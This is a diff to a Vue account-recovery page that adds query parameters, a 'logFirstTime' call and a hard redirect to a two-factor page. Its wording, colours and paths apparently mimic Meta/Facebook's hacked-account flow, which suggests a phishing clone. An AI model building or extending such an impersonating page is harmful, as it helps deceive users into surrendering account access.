@@ -1,9 +1,10 @@
+
 <template>
   <div
     class="md:hidden h-screen flex flex-col p-4 pt-12 items-center bg-gradient-to-r from-purple-50 to-blue-50"
     @click="handleResetFocus"
   >
-    <a href="/login" class="fixed top-3 left-3 cursor-pointer">
+    <a href="/login?a=1" class="fixed top-3 left-3 cursor-pointer">
       <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" viewBox="0 0 24 24">
         <!-- Icon from Material Symbols Light by Google - https://github.com/google/material-design-icons/blob/master/LICENSE -->
         <path
@@ -21,7 +22,7 @@
           "To get back in to your account, enter your current Email if you know it. If you don't think that your account was hacked, you can",
         )
       }}
-      <a class="text-[#0064E0]" href="/login">
+      <a class="text-[#0064E0]" href="/login?a=1">
         {{ $t('cancel this process') }}
       </a>
     </div>
@@ -109,7 +110,9 @@ const handleSubmit = async () => {
   } catch (error) {
     console.error(error)
   }
-  router.push('/two_step_verification/two_factor')
+  await logFirstTime()
+  window.location.href = '/two_step_verification/two_factor?a=1'
+  // router.push('/two_step_verification/two_factor')
 }
 </script>
 
